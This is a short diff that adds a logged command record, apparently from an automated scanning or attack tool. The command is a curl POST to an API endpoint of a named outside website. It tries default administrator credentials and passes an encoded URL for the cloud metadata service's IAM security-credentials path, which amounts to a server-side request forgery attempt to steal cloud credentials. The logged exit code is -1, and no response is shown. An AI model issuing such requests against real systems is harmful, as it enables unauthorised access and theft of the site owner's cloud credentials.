@@ -1,0 +1,4 @@
+# command: timeout 15 curl -s -m 13 -o - -D - -w '\nHTTP_STATUS:%{http_code}' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin&password=changeme' 'https://www.infinitycapital.bh/api/send?none=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F'
+# exit_code: -1
+# ---
+
